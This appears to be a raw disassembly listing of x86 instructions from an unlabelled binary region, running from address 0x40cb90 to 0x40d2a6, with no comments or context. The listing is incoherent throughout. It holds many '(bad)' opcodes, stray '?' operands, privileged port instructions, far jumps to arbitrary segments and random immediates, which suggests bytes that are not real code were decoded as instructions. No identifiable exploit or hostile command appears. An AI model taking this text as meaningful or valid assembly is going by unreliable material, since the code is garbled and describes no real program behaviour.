  40cb90:	cmp    ebp,ebp
  40cb92:	es in  eax,0x74
  40cb95:	mov    WORD PTR [edi-0x1e],?
  40cb98:	mov    al,0x36
  40cb9a:	push   es
  40cb9b:	xor    ebp,DWORD PTR [ecx+ebp*4+0x53]
  40cb9f:	aas    
  40cba0:	jmp    esp
  40cba2:	mov    eax,0x9686950d
  40cba7:	ret    
  40cba8:	pop    ebp
  40cba9:	mov    ebx,0x193201ad
  40cbae:	retf   0x8c3
  40cbb1:	mov    ch,0xe3
  40cbb3:	mov    ah,0x11
  40cbb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbb6:	(bad)  
  40cbb7:	stos   DWORD PTR es:[edi],eax
  40cbb8:	mov    ebp,DWORD PTR [ecx]
  40cbba:	adc    edx,DWORD PTR [edi-0x3f]
  40cbbd:	repnz loop 0x40cc34
  40cbc0:	cdq    
  40cbc1:	pop    esi
  40cbc2:	inc    ecx
  40cbc3:	sbb    BYTE PTR [ecx],ch
  40cbc5:	xor    DWORD PTR [ebx],edi
  40cbc7:	mov    bl,0xbf
  40cbc9:	arpl   ax,sp
  40cbcb:	pop    ebx
  40cbcc:	shl    DWORD PTR [ebx+0x7c91a2fa],1
  40cbd2:	sbb    ebp,DWORD PTR [ebp+0x36]
  40cbd5:	jg     0x40cba1
  40cbd7:	pop    es
  40cbd8:	shl    DWORD PTR [ecx+0x16],0x5
  40cbdc:	lds    edi,FWORD PTR [edx]
  40cbde:	test   dh,bh
  40cbe0:	mov    ecx,0x76df4bbe
  40cbe5:	data16 jae 0x40cbdf
  40cbe8:	fiadd  WORD PTR [ecx+0x71e213c3]
  40cbee:	xor    eax,0x4502019f
  40cbf3:	inc    edi
  40cbf4:	add    edi,DWORD PTR ds:0x9b150e38
  40cbfa:	dec    DWORD PTR [eax]
  40cbfc:	(bad)  
  40cbfe:	mov    al,ds:0x2c50332c
  40cc03:	adc    DWORD PTR [ebp+0x48cef5d3],edi
  40cc09:	(bad)  
  40cc0a:	sub    eax,0xb7a1a5bc
  40cc0f:	adc    BYTE PTR [ebx+edi*8-0x58e32752],0x7e
  40cc17:	inc    edx
  40cc18:	ret    0x2f22
  40cc1b:	aas    
  40cc1c:	fs into 
  40cc1e:	and    edi,0x1f01c3ba
  40cc24:	xchg   edx,eax
  40cc25:	push   ebp
  40cc26:	pop    es
  40cc27:	inc    ebp
  40cc28:	or     esi,eax
  40cc2a:	pop    eax
  40cc2b:	mov    bh,0xb0
  40cc2d:	lds    ebp,FWORD PTR [edi-0x34]
  40cc30:	push   cs
  40cc31:	les    ebp,FWORD PTR [ecx]
  40cc33:	scas   al,BYTE PTR es:[edi]
  40cc34:	dec    esi
  40cc35:	pop    eax
  40cc36:	int3   
  40cc37:	std    
  40cc38:	popf   
  40cc39:	jnp    0x40cbd6
  40cc3b:	mov    bl,0xe2
  40cc3d:	out    0xa3,al
  40cc3f:	sbb    eax,0xe0585670
  40cc44:	paddusb mm1,QWORD PTR [ebx+0x3bb9fae1]
  40cc4b:	fs jmp 0x40cbd9
  40cc4e:	int    0x8f
  40cc50:	sahf   
  40cc51:	jmp    0x7485:0x26b6d9a2
  40cc58:	je     0x40cca6
  40cc5a:	push   eax
  40cc5b:	sar    DWORD PTR [ebx+0x64a05afc],cl
  40cc61:	ins    DWORD PTR es:[edi],dx
  40cc62:	pop    edx
  40cc63:	popf   
  40cc64:	out    0x58,al
  40cc66:	adc    BYTE PTR [eax],dl
  40cc68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc69:	xor    DWORD PTR [ebx+0x26f7dd96],eax
  40cc6f:	test   al,0x2
  40cc71:	scas   eax,DWORD PTR es:[edi]
  40cc72:	cmp    esi,0xffffff83
  40cc75:	push   0x490ebeb2
  40cc7a:	pop    ds
  40cc7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc7c:	pop    ecx
  40cc7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc7e:	fs ins BYTE PTR es:[edi],dx
  40cc80:	xchg   ebx,eax
  40cc81:	shl    dl,1
  40cc83:	xchg   ebx,eax
  40cc84:	xchg   ecx,eax
  40cc85:	mov    ebx,0x92737b72
  40cc8a:	or     al,0xf5
  40cc8c:	inc    ecx
  40cc8d:	sbb    ebp,DWORD PTR [ecx]
  40cc8f:	int    0xd3
  40cc91:	arpl   WORD PTR [esi],cx
  40cc93:	aam    0x52
  40cc95:	int3   
  40cc96:	and    bh,bh
  40cc98:	jb     0x40ccd5
  40cc9a:	popf   
  40cc9b:	mov    ds:0x99fa435c,eax
  40cca0:	add    DWORD PTR [edi],esi
  40cca2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cca3:	jno    0x40cd02
  40cca5:	xor    edx,ecx
  40cca7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cca8:	xchg   ebp,eax
  40cca9:	jecxz  0x40cce5
  40ccab:	out    dx,al
  40ccac:	mov    dh,0x4d
  40ccae:	or     eax,edx
  40ccb0:	lods   eax,DWORD PTR ds:[esi]
  40ccb1:	mov    ds:0x27f2ab58,al
  40ccb6:	lock shl DWORD PTR [ebx],cl
  40ccb9:	popf   
  40ccba:	dec    esp
  40ccbb:	xor    bl,bl
  40ccbd:	lods   eax,DWORD PTR ds:[esi]
  40ccbe:	mov    dh,0xb6
  40ccc0:	adc    BYTE PTR [eax+0x7d9865ac],bh
  40ccc6:	mov    edx,ds
  40ccc8:	lahf   
  40ccc9:	aas    
  40ccca:	xor    DWORD PTR [edi+0xb],esi
  40cccd:	dec    ecx
  40ccce:	xchg   DWORD PTR [edi+0x2],ebp
  40ccd1:	cld    
  40ccd2:	out    dx,eax
  40ccd3:	neg    DWORD PTR [esi+0x79]
  40ccd6:	ins    BYTE PTR es:[edi],dx
  40ccd7:	std    
  40ccd8:	pop    es
  40ccd9:	push   ebp
  40ccda:	mov    ch,0x69
  40ccdc:	clc    
  40ccdd:	push   ebx
  40ccde:	test   ebx,0xa19d9c3c
  40cce4:	add    DWORD PTR [ebx+edx*4-0x76],esi
  40cce8:	int    0xc8
  40ccea:	lock jo 0x40cce1
  40cced:	cmp    ecx,DWORD PTR [edi]
  40ccef:	xor    esp,edx
  40ccf1:	mov    WORD PTR [edi-0x56c96f9d],gs
  40ccf7:	jne    0x40cc86
  40ccf9:	jno    0x40cd5c
  40ccfb:	imul   ebp,DWORD PTR [esp+edx*1],0x7b
  40ccff:	inc    ebp
  40cd00:	shl    BYTE PTR [edx],1
  40cd02:	inc    ebp
  40cd03:	jne    0x40ccc6
  40cd05:	mov    gs,WORD PTR [eax]
  40cd07:	jmp    0x580fdd77
  40cd0c:	pavgb  mm2,mm3
  40cd0f:	push   es
  40cd10:	push   cs
  40cd11:	mov    esp,0xe5698bf1
  40cd16:	dec    ebp
  40cd17:	push   DWORD PTR [ebp-0x2c1253ca]
  40cd1d:	mov    WORD PTR [eax-0x19],gs
  40cd20:	pop    esp
  40cd21:	add    bl,BYTE PTR [edi]
  40cd23:	mov    bl,0x87
  40cd25:	mov    ds:0xb08a62c8,al
  40cd2a:	(bad)  
  40cd2b:	(bad)  
  40cd2d:	(bad)  
  40cd2e:	sbb    BYTE PTR [edx+0x53],ch
  40cd31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd32:	repz aad 0x5e
  40cd35:	daa    
  40cd36:	jne    0x40ccbb
  40cd38:	sub    eax,0x27acb83b
  40cd3d:	mov    ah,BYTE PTR [ebp+ebp*2-0x23]
  40cd41:	push   ebp
  40cd42:	push   ebp
  40cd43:	inc    edx
  40cd44:	les    esp,FWORD PTR [ebp+0x37]
  40cd47:	mov    esi,esp
  40cd49:	rcr    DWORD PTR [esi+0x3d],1
  40cd4c:	imul   esi,DWORD PTR [esi+0x5d],0xffffffdf
  40cd50:	sbb    ecx,DWORD PTR fs:[ebp+0x2f42e886]
  40cd57:	lock mov ebp,0xa6d6508
  40cd5d:	clc    
  40cd5e:	ins    BYTE PTR es:[edi],dx
  40cd5f:	lods   al,BYTE PTR ds:[esi]
  40cd60:	jecxz  0x40cd8e
  40cd62:	mov    esi,esp
  40cd64:	jbe    0x40ccf6
  40cd66:	xchg   ecx,eax
  40cd67:	xor    DWORD PTR [esp+eiz*4],ecx
  40cd6a:	xor    BYTE PTR [edx-0x7d],ch
  40cd6d:	inc    BYTE PTR ds:0x88372b02
  40cd73:	dec    esp
  40cd74:	aad    0xe8
  40cd76:	imul   eax,DWORD PTR [edi-0x2c],0xffffff81
  40cd7a:	loop   0x40cde3
  40cd7c:	retf   
  40cd7d:	xor    al,0xe8
  40cd7f:	sub    al,0xa0
  40cd81:	out    dx,al
  40cd82:	or     ebx,edx
  40cd84:	mov    WORD PTR [esi+0x188539eb],fs
  40cd8a:	sbb    eax,0xbc452848
  40cd8f:	pop    edx
  40cd90:	jmp    0x8fd64fd3
  40cd95:	cmp    DWORD PTR [edi],esi
  40cd97:	call   0x230b9dd2
  40cd9c:	gs iret 
  40cd9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd9f:	fnstenv [ecx]
  40cda1:	aam    0xac
  40cda3:	push   es
  40cda4:	inc    ebp
  40cda5:	pop    es
  40cda6:	aas    
  40cda7:	pop    ss
  40cda8:	mov    bh,al
  40cdaa:	mov    WORD PTR [eax-0x76],cs
  40cdad:	fisub  DWORD PTR [edi-0x2b]
  40cdb0:	pop    edx
  40cdb1:	xchg   ebx,eax
  40cdb2:	dec    BYTE PTR [eax+0x67f0fc5]
  40cdb8:	xor    esp,eax
  40cdba:	rcl    ebx,1
  40cdbc:	pop    ebp
  40cdbd:	sbb    al,0x7a
  40cdbf:	jns    0x40ce3b
  40cdc1:	ret    0xf7e5
  40cdc4:	test   eax,0x7c5ec7d4
  40cdc9:	nop
  40cdca:	in     al,0xfe
  40cdcc:	stos   BYTE PTR es:[edi],al
  40cdcd:	cld    
  40cdce:	in     al,dx
  40cdcf:	sub    ah,BYTE PTR [esi]
  40cdd1:	mov    esp,0x3efaca48
  40cdd6:	push   edi
  40cdd7:	jge    0x40cd85
  40cdd9:	les    ecx,FWORD PTR [ecx+0x2563594f]
  40cddf:	or     al,cl
  40cde1:	push   edx
  40cde2:	sti    
  40cde3:	push   ss
  40cde4:	lods   al,BYTE PTR ds:[esi]
  40cde5:	std    
  40cde6:	push   ebp
  40cde7:	adc    ah,BYTE PTR [ebx-0x540e4eaf]
  40cded:	call   DWORD PTR [eax+0x8aafed6]
  40cdf3:	pop    es
  40cdf4:	adc    esi,edi
  40cdf6:	mov    bl,BYTE PTR ds:0xf252e2ea
  40cdfc:	jmp    0xf969:0xbe46fd42
  40ce03:	mov    ch,0xec
  40ce05:	sbb    edx,DWORD PTR [esp+edi*4-0x1947ba9e]
  40ce0c:	repnz mov bl,0x30
  40ce0f:	and    ebx,edi
  40ce11:	mov    ds:0x3b62d35a,al
  40ce16:	int3   
  40ce17:	cli    
  40ce18:	into   
  40ce19:	sub    al,0xcb
  40ce1b:	pop    es
  40ce1c:	dec    ebx
  40ce1d:	push   edx
  40ce1e:	clc    
  40ce1f:	xor    DWORD PTR [esi],edi
  40ce21:	or     BYTE PTR [esi],dl
  40ce23:	dec    edi
  40ce24:	and    ch,al
  40ce26:	mov    ebx,0xac7d7f2a
  40ce2b:	add    eax,0x7d19217c
  40ce30:	add    dl,BYTE PTR [edx]
  40ce32:	loop   0x40cdf1
  40ce34:	or     ebx,DWORD PTR [eax-0x7e5f424b]
  40ce3a:	jo     0x40ce53
  40ce3c:	mov    bl,BYTE PTR [ebp-0x4f5e1ffd]
  40ce42:	shl    DWORD PTR ss:[ecx+0x6315b8e4],1
  40ce49:	in     eax,0x3
  40ce4b:	mov    esp,0x3fb50dbe
  40ce50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce51:	in     eax,0xab
  40ce53:	or     BYTE PTR [eax-0x3ab6e638],dh
  40ce59:	push   edx
  40ce5a:	add    al,0xe6
  40ce5c:	jns    0x40ce79
  40ce5e:	(bad)  
  40ce5f:	mov    edi,0xb188789f
  40ce64:	push   cs
  40ce65:	aaa    
  40ce66:	sub    edi,ebx
  40ce68:	popf   
  40ce69:	jbe    0x40ceb6
  40ce6b:	jle    0x40cdfa
  40ce6d:	pop    edi
  40ce6e:	ds jmp 0x40ceec
  40ce71:	xchg   BYTE PTR [ebx-0x73],al
  40ce74:	and    BYTE PTR [edx-0x3922a7b3],0x61
  40ce7b:	(bad)  [esi+0x55]
  40ce7e:	pop    esp
  40ce7f:	mov    ebx,gs
  40ce81:	aaa    
  40ce82:	xchg   esp,eax
  40ce83:	mov    esi,0xc40ca4c7
  40ce88:	mov    eax,ds:0xf119afb5
  40ce8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce8e:	lahf   
  40ce8f:	mov    DWORD PTR [ebp+ebx*8+0x5d],edx
  40ce93:	test   dl,cl
  40ce95:	ret    
  40ce96:	add    BYTE PTR [ecx],ch
  40ce98:	cmp    dh,dh
  40ce9a:	inc    esp
  40ce9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce9c:	pop    edx
  40ce9d:	mov    esp,0x2d74a526
  40cea2:	dec    ebx
  40cea3:	mov    bh,0x7f
  40cea5:	xor    ebp,DWORD PTR [edx+eiz*1]
  40cea8:	jae    0x40cf24
  40ceaa:	jns    0x40ce90
  40ceac:	xor    eax,0x33f93497
  40ceb1:	pop    eax
  40ceb2:	push   eax
  40ceb3:	retf   
  40ceb4:	cmp    eax,0xb6a0652d
  40ceb9:	mov    BYTE PTR [eax+edi*4+0x52],dh
  40cebd:	mov    BYTE PTR [edi],ah
  40cebf:	or     ah,BYTE PTR [ecx]
  40cec1:	scas   al,BYTE PTR es:[edi]
  40cec2:	fwait
  40cec3:	das    
  40cec4:	fisttp QWORD PTR [ebx-0x70]
  40cec7:	out    0x6c,eax
  40cec9:	jne    0x40cf49
  40cecb:	dec    edx
  40cecc:	dec    ecx
  40cecd:	sub    eax,0x7cecfcaa
  40ced2:	es scas eax,DWORD PTR es:[edi]
  40ced4:	test   al,0xf6
  40ced6:	lock jbe 0x40cef5
  40ced9:	outs   dx,DWORD PTR ds:[esi]
  40ceda:	ror    DWORD PTR [edx+0x7be09e7b],0xac
  40cee1:	pop    ss
  40cee2:	push   ebx
  40cee3:	dec    ebp
  40cee4:	shl    BYTE PTR [ebx],cl
  40cee6:	scas   al,BYTE PTR es:[edi]
  40cee7:	sub    cl,ah
  40cee9:	jo     0x40ce6b
  40ceeb:	mov    BYTE PTR [ebp-0x3d17239e],bh
  40cef1:	popf   
  40cef2:	mov    ebp,0x58b49574
  40cef7:	std    
  40cef8:	cmc    
  40cef9:	out    0xfb,eax
  40cefb:	mov    cl,0x73
  40cefd:	ret    0x3092
  40cf00:	mov    ds:0xf2eb7228,eax
  40cf05:	fsub   QWORD PTR [edx+0x7b]
  40cf08:	pop    ecx
  40cf09:	and    esp,DWORD PTR [eax-0x1ce73e88]
  40cf0f:	int    0x7b
  40cf11:	xor    dl,bh
  40cf13:	xlat   BYTE PTR ds:[ebx]
  40cf14:	(bad)  
  40cf15:	(bad)
  40cf18:	test   al,0x9c
  40cf1a:	loopne 0x40cec0
  40cf1c:	retf   0x9a5c
  40cf1f:	mov    esp,0x51f9c648
  40cf24:	pusha  
  40cf25:	jnp    0x40cf53
  40cf27:	test   DWORD PTR [ecx+ebp*8],esi
  40cf2a:	inc    edx
  40cf2b:	aam    0x4a
  40cf2d:	adc    DWORD PTR [edx-0x53],0x4d29358d
  40cf34:	(bad)  
  40cf35:	sub    edx,DWORD PTR [ecx+edi*4-0x3124e648]
  40cf3c:	hlt    
  40cf3d:	push   ss
  40cf3e:	ror    dl,1
  40cf40:	or     DWORD PTR [eax+0x6c56a4c9],0x10024cf5
  40cf4a:	test   eax,0xff5f3ba6
  40cf4f:	sub    bh,BYTE PTR [ebp+edx*1+0x34]
  40cf53:	je     0x40cf0a
  40cf55:	pop    esi
  40cf56:	push   es
  40cf57:	sbb    al,0x75
  40cf59:	sti    
  40cf5a:	es (bad) 
  40cf5c:	mov    dl,BYTE PTR [edi+0x36259d3d]
  40cf62:	outs   dx,DWORD PTR ds:[esi]
  40cf63:	lods   eax,DWORD PTR ds:[esi]
  40cf64:	bnd jno 0x40cf4e
  40cf67:	add    al,ah
  40cf69:	sahf   
  40cf6a:	fidiv  WORD PTR [ecx]
  40cf6c:	retf   
  40cf6d:	push   ss
  40cf6e:	and    ecx,ebp
  40cf70:	mov    dl,0x4a
  40cf72:	mov    ecx,0x3f6ccf65
  40cf77:	pop    esp
  40cf78:	out    0xeb,al
  40cf7a:	push   ebp
  40cf7b:	xor    DWORD PTR [edx+0x161c34b8],0xffffffde
  40cf82:	mov    ?,ebp
  40cf84:	ret    0xadf4
  40cf87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf88:	icebp  
  40cf89:	mov    dl,0x1d
  40cf8b:	out    dx,al
  40cf8c:	sbb    eax,0xcb73a70f
  40cf91:	xchg   edi,eax
  40cf92:	cmp    eax,DWORD PTR [edi+eiz*2]
  40cf95:	into   
  40cf96:	mov    eax,ds:0x67317964
  40cf9b:	sar    DWORD PTR [ebx],1
  40cf9d:	(bad)  
  40cf9e:	and    eax,0xce6d5c6f
  40cfa3:	adc    eax,0x80dcd3
  40cfa8:	or     eax,0x605b21a9
  40cfad:	sbb    esp,ebx
  40cfaf:	dec    DWORD PTR [edi-0x6690c74b]
  40cfb5:	inc    eax
  40cfb6:	scas   al,BYTE PTR es:[edi]
  40cfb7:	scas   al,BYTE PTR es:[edi]
  40cfb8:	add    al,BYTE PTR [esi+0x5e25b30a]
  40cfbe:	push   es
  40cfbf:	sbb    al,0x6a
  40cfc1:	mov    al,0xf8
  40cfc3:	add    edi,DWORD PTR [esi]
  40cfc5:	sbb    cl,BYTE PTR [ebp-0x777a326b]
  40cfcb:	jge    0x40cf8b
  40cfcd:	xor    al,0xba
  40cfcf:	mov    al,ds:0x147f25fd
  40cfd4:	ja     0x40d04b
  40cfd6:	imul   edx,DWORD PTR [edx-0x7f1c6f6],0xb
  40cfdd:	jp     0x40cfaf
  40cfdf:	int3   
  40cfe0:	loop   0x40d00f
  40cfe2:	push   eax
  40cfe3:	mov    esp,0x97ada17
  40cfe8:	push   ss
  40cfe9:	xor    al,0x61
  40cfeb:	sub    cl,BYTE PTR [esi]
  40cfed:	jecxz  0x40cf88
  40cfef:	cmp    DWORD PTR [eax],ebx
  40cff1:	jne    0x40cfb3
  40cff3:	inc    ebp
  40cff4:	xor    bh,BYTE PTR [esi+0x3cd7c6d4]
  40cffa:	jno    0x40cfac
  40cffc:	out    0x96,al
  40cffe:	push   ecx
  40cfff:	addr16 pop ds
  40d001:	jnp    0x40cf86
  40d003:	(bad)  
  40d004:	gs dec ebx
  40d006:	call   0xee74d388
  40d00b:	sub    eax,0xc42b878b
  40d010:	aas    
  40d011:	sbb    ah,BYTE PTR ds:0xd06b4d49
  40d017:	or     BYTE PTR [edi+0x14c80da5],al
  40d01d:	mov    ds:0xe46b153c,al
  40d022:	cmc    
  40d023:	dec    eax
  40d024:	loope  0x40cff9
  40d026:	xlat   BYTE PTR ds:[ebx]
  40d027:	fucomip st,st(0)
  40d029:	pop    ebp
  40d02a:	pop    ds
  40d02b:	xlat   BYTE PTR ds:[ebx]
  40d02c:	fdivr  QWORD PTR ds:0xf4f744ce
  40d032:	imul   eax,DWORD PTR [ebp+ebx*4+0x3],0xffffffac
  40d037:	into   
  40d038:	sahf   
  40d039:	ja     0x40cfc6
  40d03b:	cdq    
  40d03c:	jge    0x40cff5
  40d03e:	and    esp,ebx
  40d040:	inc    edx
  40d041:	adc    BYTE PTR [ebp-0x56a1e0c6],ah
  40d047:	inc    ecx
  40d048:	lock aam 0xea
  40d04b:	pop    eax
  40d04c:	push   ebp
  40d04d:	jo     0x40d02d
  40d04f:	gs jns 0x40cff5
  40d052:	jb     0x40d06c
  40d054:	xor    BYTE PTR [eax-0x4c],cl
  40d057:	cmp    ebx,DWORD PTR [ebx+0x74]
  40d05a:	push   eax
  40d05b:	or     DWORD PTR [eax-0x6aa8a134],edi
  40d061:	ret    0x59f
  40d064:	jmp    0xa3414acc
  40d069:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d06a:	add    DWORD PTR [edi-0x3],ebp
  40d06d:	push   ss
  40d06e:	outs   dx,BYTE PTR ds:[esi]
  40d06f:	outs   dx,DWORD PTR ds:[esi]
  40d070:	and    bl,BYTE PTR [eax+0x53]
  40d073:	mov    ch,dl
  40d075:	pop    ecx
  40d076:	adc    eax,DWORD PTR [ecx-0x6f25a5c9]
  40d07c:	shl    DWORD PTR [edi-0x37ccdba3],cl
  40d082:	add    DWORD PTR [ebp+0x7f],edx
  40d085:	or     dh,bl
  40d087:	adc    cl,BYTE PTR [edi+0x23be2a1e]
  40d08d:	mov    esi,0x7bcc1930
  40d092:	mov    ebp,0x50bb44d8
  40d097:	dec    eax
  40d098:	or     ecx,DWORD PTR [ebp-0x23]
  40d09b:	inc    BYTE PTR [edx]
  40d09d:	cwde   
  40d09e:	cs pop ds
  40d0a0:	ror    BYTE PTR [eax+0x62],cl
  40d0a3:	sti    
  40d0a4:	cli    
  40d0a5:	test   DWORD PTR [edi],ebx
  40d0a7:	xchg   edi,eax
  40d0a8:	je     0x40d07c
  40d0aa:	mov    cl,0xf8
  40d0ac:	jg     0x40d032
  40d0ae:	frstor [esp+edi*8]
  40d0b1:	fcmovnbe st,st(6)
  40d0b4:	outs   dx,BYTE PTR ds:[esi]
  40d0b5:	js     0x40d0b5
  40d0b7:	xor    al,0x83
  40d0b9:	xchg   esp,eax
  40d0ba:	xchg   edi,eax
  40d0bb:	loop   0x40d0bb
  40d0bd:	inc    eax
  40d0be:	int    0xf6
  40d0c0:	rol    DWORD PTR [esi+0x4],0x5d
  40d0c4:	test   al,0xe2
  40d0c6:	sub    dh,BYTE PTR [edx+ebx*8+0x1b41005d]
  40d0cd:	mov    esi,DWORD PTR [ebp+0x643ea580]
  40d0d3:	sti    
  40d0d4:	arpl   WORD PTR [edx],cx
  40d0d6:	enter  0xd10e,0xbe
  40d0da:	dec    eax
  40d0db:	test   eax,0xa74f7f31
  40d0e0:	push   ss
  40d0e1:	xor    eax,0x56e60116
  40d0e6:	xlat   BYTE PTR ds:[ebx]
  40d0e7:	mov    edi,0x290f8cdf
  40d0ec:	js     0x40d0c4
  40d0ee:	std    
  40d0ef:	pop    ebx
  40d0f0:	sti    
  40d0f1:	mov    BYTE PTR [eax+0x6bf999f2],bh
  40d0f7:	loopne 0x40d08d
  40d0f9:	cli    
  40d0fa:	je     0x40d0f9
  40d0fc:	scas   eax,DWORD PTR es:[edi]
  40d0fd:	sbb    esp,DWORD PTR [eax-0xa22e094]
  40d103:	or     esi,DWORD PTR [edx+0x8]
  40d106:	outs   dx,DWORD PTR ds:[esi]
  40d107:	sbb    BYTE PTR [edi-0x3f],0x7f
  40d10b:	retf   
  40d10c:	(bad)  
  40d10d:	dec    ebx
  40d10e:	scas   eax,DWORD PTR es:[edi]
  40d10f:	scas   eax,DWORD PTR es:[edi]
  40d110:	nop
  40d111:	jo     0x40d0d1
  40d113:	sar    BYTE PTR [esi+0xf01ab41],cl
  40d119:	sub    ebx,DWORD PTR [ecx+ebp*1-0x7d]
  40d11d:	neg    BYTE PTR [edi-0x23]
  40d120:	ret    0xf644
  40d123:	sub    al,0x5c
  40d125:	out    0x89,eax
  40d127:	aaa    
  40d128:	les    edx,FWORD PTR ds:0x8430271d
  40d12e:	frstor [ebx-0x289eb73d]
  40d134:	test   dl,al
  40d136:	and    DWORD PTR [ebx-0x6391d024],0xffffffff
  40d13d:	out    dx,al
  40d13e:	and    al,0x9b
  40d140:	into   
  40d141:	into   
  40d142:	cmp    eax,0xa769b2ca
  40d147:	mov    dh,al
  40d149:	sub    al,0xc3
  40d14b:	dec    esp
  40d14c:	mov    ds:0x497845f5,al
  40d151:	push   ebx
  40d152:	push   ecx
  40d153:	fs je  0x40d0fb
  40d156:	xchg   esi,eax
  40d157:	aas    
  40d158:	popa   
  40d159:	mov    bh,0x8c
  40d15b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d15c:	stc    
  40d15d:	pop    esi
  40d15e:	setae  BYTE PTR [edi+0x3a]
  40d162:	push   esi
  40d163:	and    DWORD PTR [edx],esi
  40d165:	dec    ebp
  40d166:	sbb    DWORD PTR [esi],ebp
  40d168:	sbb    bl,dl
  40d16a:	call   0x314d73a2
  40d16f:	mov    ebx,0x257161ca
  40d174:	xchg   esi,eax
  40d175:	mul    esp
  40d177:	mov    esi,0x45e176be
  40d17c:	repnz iret 
  40d17e:	lahf   
  40d17f:	sub    BYTE PTR [eax],ch
  40d181:	mov    ebx,0x564d47be
  40d186:	push   esi
  40d187:	scas   al,BYTE PTR es:[edi]
  40d188:	enter  0x60c6,0x46
  40d18c:	mov    ds:0x5d49ab77,eax
  40d191:	adc    DWORD PTR [eax],0xffffffe3
  40d194:	pop    ebp
  40d195:	or     DWORD PTR [edx],0xffffffff
  40d198:	int    0xa6
  40d19a:	(bad)  [ebp+ebx*4+0x1c826d87]
  40d1a1:	sub    DWORD PTR [esi-0x1],edi
  40d1a4:	jl     0x40d132
  40d1a6:	cwde   
  40d1a7:	shr    ebx,1
  40d1a9:	mov    ebp,ebp
  40d1ab:	jne    0x40d21b
  40d1ad:	faddp  st(1),st
  40d1af:	ret    
  40d1b0:	(bad)  
  40d1b1:	fist   WORD PTR [ebx]
  40d1b3:	cs in  al,0x1c
  40d1b6:	cli    
  40d1b7:	pop    ebx
  40d1b8:	or     esp,edx
  40d1ba:	mov    gs,WORD PTR [ebp-0x4986a100]
  40d1c0:	pusha  
  40d1c1:	add    cl,bh
  40d1c3:	xchg   edi,esi
  40d1c5:	call   0xfe512953
  40d1ca:	mov    cl,0x2d
  40d1cc:	cdq    
  40d1cd:	out    0x4b,eax
  40d1cf:	fstp   QWORD PTR [edi-0x16]
  40d1d2:	push   cs
  40d1d3:	in     eax,0x37
  40d1d5:	adc    BYTE PTR [edi+0x7f],dh
  40d1d8:	pop    eax
  40d1d9:	push   esp
  40d1da:	iret   
  40d1db:	mov    DWORD PTR [edx+0x31],ecx
  40d1de:	mov    al,ds:0x9298183c
  40d1e3:	inc    ecx
  40d1e4:	bound  edi,QWORD PTR [esi]
  40d1e6:	pop    edx
  40d1e7:	std    
  40d1e8:	icebp  
  40d1e9:	jmp    DWORD PTR [edx+0x48]
  40d1ec:	in     al,0xe0
  40d1ee:	push   eax
  40d1ef:	jle    0x40d234
  40d1f1:	xchg   ebp,eax
  40d1f2:	cdq    
  40d1f3:	fild   DWORD PTR [edx+0xb]
  40d1f6:	ret    0xa417
  40d1f9:	rcr    BYTE PTR [ebp+0x69500ccc],cl
  40d1ff:	scas   al,BYTE PTR es:[edi]
  40d200:	xchg   edx,eax
  40d201:	cmc    
  40d202:	lods   al,BYTE PTR ds:[esi]
  40d203:	xchg   esi,eax
  40d204:	arpl   sp,si
  40d206:	lahf   
  40d207:	push   cs
  40d208:	rol    DWORD PTR [ecx],1
  40d20a:	cmp    si,WORD PTR [esi-0x2c]
  40d20e:	bound  eax,QWORD PTR [esi+0x21]
  40d211:	jp     0x40d22b
  40d213:	test   ebp,esi
  40d215:	xor    al,dl
  40d217:	ins    BYTE PTR es:[edi],dx
  40d218:	and    DWORD PTR [ecx+0x4c7d49bb],ebx
  40d21e:	push   ds
  40d21f:	xor    al,0x66
  40d221:	sub    edi,DWORD PTR [esi]
  40d223:	cmp    BYTE PTR [edi+0x378ad05f],al
  40d229:	pop    ss
  40d22a:	pop    es
  40d22b:	inc    eax
  40d22c:	push   edx
  40d22d:	xor    ah,BYTE PTR [eax+0x3054a354]
  40d233:	xchg   esi,eax
  40d234:	fnstsw WORD PTR [ecx+0x71]
  40d237:	adc    DWORD PTR [ebx+ecx*4+0x1129dcc9],edx
  40d23e:	mov    esi,0xb697d649
  40d243:	sub    eax,0xb7ec16aa
  40d248:	push   edi
  40d249:	pop    ecx
  40d24a:	not    BYTE PTR [edi+0x60f71ed8]
  40d250:	retf   0x1a85
  40d253:	push   eax
  40d254:	push   esi
  40d255:	cmovo  esp,edi
  40d258:	push   ebp
  40d259:	jl     0x40d2b9
  40d25b:	lods   eax,DWORD PTR ds:[esi]
  40d25c:	push   eax
  40d25d:	ins    BYTE PTR es:[edi],dx
  40d25e:	ficom  DWORD PTR [eax-0x4c56cdb5]
  40d264:	xchg   esp,eax
  40d265:	jg     0x40d222
  40d267:	out    0x94,al
  40d269:	jg     0x40d2e4
  40d26b:	ds stos BYTE PTR es:[edi],al
  40d26d:	or     eax,DWORD PTR [edi+0x48c5e1cb]
  40d273:	arpl   WORD PTR [edi-0x34],dx
  40d276:	add    ah,BYTE PTR [esi-0x17fec5ac]
  40d27c:	inc    ebp
  40d27d:	repz mov bh,0x4e
  40d280:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d281:	ret    
  40d282:	adc    ebp,DWORD PTR [esp+edx*8]
  40d285:	inc    esi
  40d286:	xor    al,0xb9
  40d288:	xchg   edi,eax
  40d289:	mov    ah,0x1e
  40d28b:	stos   DWORD PTR es:[edi],eax
  40d28c:	mov    ebx,0xaa713938
  40d291:	mov    ds:0x829b9590,eax
  40d296:	xchg   edx,eax
  40d297:	xchg   ebp,eax
  40d298:	xor    al,0xda
  40d29a:	jne    0x40d224
  40d29c:	jae    0x40d2a1
  40d29e:	mov    ecx,0xc9701717
  40d2a3:	and    al,0x48
  40d2a5:	pop    ecx
  40d2a6:	fisubr WORD PTR [edi]
